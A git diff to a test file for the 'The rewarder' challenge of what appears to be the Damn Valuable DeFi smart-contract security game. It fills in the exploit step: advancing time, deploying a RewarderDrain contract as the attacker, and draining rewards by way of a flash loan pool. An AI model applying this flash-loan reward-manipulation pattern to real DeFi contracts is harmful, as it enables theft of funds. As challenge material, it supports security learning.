@@ -6,6 +6,7 @@ const TheRewarderPool = contract.fromArtifact('TheRewarderPool');
 const DamnValuableToken = contract.fromArtifact('DamnValuableToken');
 const RewardToken = contract.fromArtifact('RewardToken');
 const AccountingToken = contract.fromArtifact('AccountingToken');
+const RewarderDrain = contract.fromArtifact('RewarderDrain');
 
 const { expect } = require('chai');
 
@@ -60,7 +61,9 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        await time.increase(time.duration.days(5));
+        const drainContract = await RewarderDrain.new(this.rewarderPool.address, {from : attacker});
+        await drainContract.drain(this.flashLoanPool.address, TOKENS_IN_LENDER_POOL, {from : attacker});
     });
 
     after(async function () {
